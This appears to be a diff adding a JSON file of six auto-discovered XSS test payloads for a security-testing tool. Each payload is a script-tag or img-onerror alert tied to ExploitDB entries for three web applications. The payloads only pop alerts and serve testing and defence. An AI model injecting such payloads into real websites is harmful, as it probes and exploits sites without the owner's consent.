@@ -1,0 +1,112 @@
+{
+  "category": "xss",
+  "subcategory": "threat_intel_xss",
+  "description": "Auto-discovered payloads from threat intelligence feeds",
+  "source": "fray threat-intel feed",
+  "count": 6,
+  "payloads": [
+    {
+      "id": "threat-intel-fd2a61712e09ee37-0000",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<script>alert('[webapps] Piranha CMS 12.0 - S')</script>",
+      "description": "ExploitDB: [webapps] Piranha CMS 12.0 - Stored XSS in Text Block",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52471",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    },
+    {
+      "id": "threat-intel-f422998e8b595e87-0001",
+      "category": "xss",
+      "subcategory": "event_handler",
+      "payload": "<img src=x onerror=alert('[webapps] Piranha CMS 12.0 - S')>",
+      "description": "ExploitDB: [webapps] Piranha CMS 12.0 - Stored XSS in Text Block",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52471",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    },
+    {
+      "id": "threat-intel-b83d7bb3f7fe8b94-0002",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<script>alert('[webapps] RPi-Jukebox-RFID 2.8')</script>",
+      "description": "ExploitDB: [webapps] RPi-Jukebox-RFID 2.8.0 - Stored Cross-Site Scripting (XSS)",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52470",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    },
+    {
+      "id": "threat-intel-9ff13e5f0d1e7033-0003",
+      "category": "xss",
+      "subcategory": "event_handler",
+      "payload": "<img src=x onerror=alert('[webapps] RPi-Jukebox-RFID 2.8')>",
+      "description": "ExploitDB: [webapps] RPi-Jukebox-RFID 2.8.0 - Stored Cross-Site Scripting (XSS)",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52470",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    },
+    {
+      "id": "threat-intel-08faf38ea63cb039-0004",
+      "category": "xss",
+      "subcategory": "reflected_xss",
+      "payload": "<script>alert('[webapps] MaNGOSWebV4  4.0.6 -')</script>",
+      "description": "ExploitDB: [webapps] MaNGOSWebV4  4.0.6 - Reflected XSS",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52457",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    },
+    {
+      "id": "threat-intel-c02f2bcef020df0b-0005",
+      "category": "xss",
+      "subcategory": "event_handler",
+      "payload": "<img src=x onerror=alert('[webapps] MaNGOSWebV4  4.0.6 -')>",
+      "description": "ExploitDB: [webapps] MaNGOSWebV4  4.0.6 - Reflected XSS",
+      "source": "ExploitDB",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "severity": "high",
+      "reference": "https://www.exploit-db.com/exploits/52457",
+      "tags": [
+        "exploitdb",
+        "threat-intel"
+      ]
+    }
+  ],
+  "last_updated": "2026-03-09T06:02:41.038796+00:00"
+}
